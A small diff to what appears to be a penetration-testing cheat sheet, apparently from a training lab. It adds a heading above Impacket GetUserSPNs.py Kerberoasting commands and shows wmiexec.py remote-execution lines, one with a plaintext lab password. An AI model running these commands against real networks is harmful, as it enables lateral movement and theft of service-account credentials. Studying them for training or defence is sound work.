@@ -12,7 +12,8 @@ wmiexec.py domain.local/username:'password'@host.ip
 wmixec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
 ```
 
-### Kerberoast with Linux
+### GetUserSPNs.py
+Kerberoasting with Linux
 ```
 GetUserSPNs.py -dc-ip <172.16.5.5> <domain.LOCAL>/<user> -request
 GetUserSPNs.py -dc-ip <172.16.5.5> <domain.LOCAL>/<user> -request-user <any-user> -outputfile <text-file-name>
